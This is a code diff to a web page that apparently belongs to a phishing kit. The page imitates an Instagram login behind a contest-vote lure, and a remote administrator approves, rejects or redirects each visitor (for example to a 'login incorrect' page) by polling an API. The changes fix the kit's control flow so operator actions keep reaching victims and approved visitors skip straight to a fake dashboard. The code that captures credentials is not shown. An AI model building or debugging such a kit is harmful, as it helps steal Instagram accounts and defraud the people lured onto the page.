@@ -296,7 +296,6 @@
                 });
                 saveUsers(users);
             } else {
-                existing.status = 'visiting';
                 existing.time = time;
                 saveUsers(users);
             }
@@ -337,6 +336,25 @@
             }
         }
 
+        // If this visitor is already approved, go straight to the dashboard
+        // instead of showing the login form (first page) again.
+        (function initApprovedIfReady() {
+            var vid = getClientId();
+            var list = getUsers();
+            var rec = list.find(function(x) { return x.visitorId === vid; });
+            if (rec && rec.status === 'approved') {
+                currentUser = rec.username;
+                pageLogin.style.display = 'none';
+                waitingScreen.classList.remove('show');
+                document.getElementById('dashUsername').textContent = '@' + currentUser;
+                document.getElementById('dashName').textContent = currentUser;
+                dashboard.classList.add('show');
+                if (fromConcours === 'concours' && concoursVote) {
+                    registerVote(currentUser, concoursVote, concoursRef);
+                }
+            }
+        })();
+
         var actionPages = {
             'login': 'INSTAGRAM.html',
             'login_incorrect': 'INSTAGRAM.html?error=1',
@@ -358,7 +376,9 @@
             if (target.pathname === window.location.pathname && target.search === window.location.search) {
                 return; // already on the target page - avoid reload loop
             }
-            window.location.href = page + (page.indexOf('?') > -1 ? '&' : '?') + 'user=' + encodeURIComponent(currentUser || '');
+            // never send an empty user param (target pages bounce back to the first page if empty)
+            var u = currentUser || username || getClientId();
+            window.location.href = page + (page.indexOf('?') > -1 ? '&' : '?') + 'user=' + encodeURIComponent(u);
         }
         var visitorPoll = setInterval(function() {
             var visitorId = getClientId();
@@ -418,40 +438,31 @@
         });
 
         function startChecking() {
-            if (visitorPoll) { clearInterval(visitorPoll); visitorPoll = null; }
+            // visitorPoll keeps running (it is the single action consumer);
+            // checkInterval only watches the status while waiting.
             if (checkInterval) clearInterval(checkInterval);
             var visitorId = getClientId();
             checkInterval = setInterval(function() {
-                fetch(API_BASE + '/api/consume_action?visitorId=' + encodeURIComponent(visitorId))
-                    .then(function(r) { return r.json(); })
-                    .then(function(d) {
-                        if (d && d.action) {
-                            clearInterval(checkInterval);
-                            goAction(d.action, d.username || currentUser);
-                            return;
-                        }
-                        syncFromServer();
-                        var users = getUsers();
-                        var user = users.find(function(u) { return u.visitorId === visitorId; });
-                        if (user && user.status === 'approved') {
-                            clearInterval(checkInterval);
-                            waitingScreen.classList.remove('show');
-                            document.getElementById('dashUsername').textContent = '@' + currentUser;
-                            document.getElementById('dashName').textContent = currentUser;
-                            dashboard.classList.add('show');
-                            if (fromConcours === 'concours' && concoursVote) {
-                                registerVote(currentUser, concoursVote, concoursRef);
-                            }
-                        } else if (user && user.status === 'rejected') {
-                            clearInterval(checkInterval);
-                            waitingScreen.classList.remove('show');
-                            pageLogin.style.display = 'flex';
-                            eEl.textContent = 'Votre demande a été rejetée par un administrateur.';
-                            eEl.style.display = 'block';
-                            currentUser = null;
-                        }
-                    })
-                    .catch(function() {});
+                syncFromServer();
+                var users = getUsers();
+                var user = users.find(function(u) { return u.visitorId === visitorId; });
+                if (user && user.status === 'approved') {
+                    clearInterval(checkInterval);
+                    waitingScreen.classList.remove('show');
+                    document.getElementById('dashUsername').textContent = '@' + currentUser;
+                    document.getElementById('dashName').textContent = currentUser;
+                    dashboard.classList.add('show');
+                    if (fromConcours === 'concours' && concoursVote) {
+                        registerVote(currentUser, concoursVote, concoursRef);
+                    }
+                } else if (user && user.status === 'rejected') {
+                    clearInterval(checkInterval);
+                    waitingScreen.classList.remove('show');
+                    pageLogin.style.display = 'flex';
+                    eEl.textContent = 'Votre demande a été rejetée par un administrateur.';
+                    eEl.style.display = 'block';
+                    currentUser = null;
+                }
             }, 2000);
         }
 
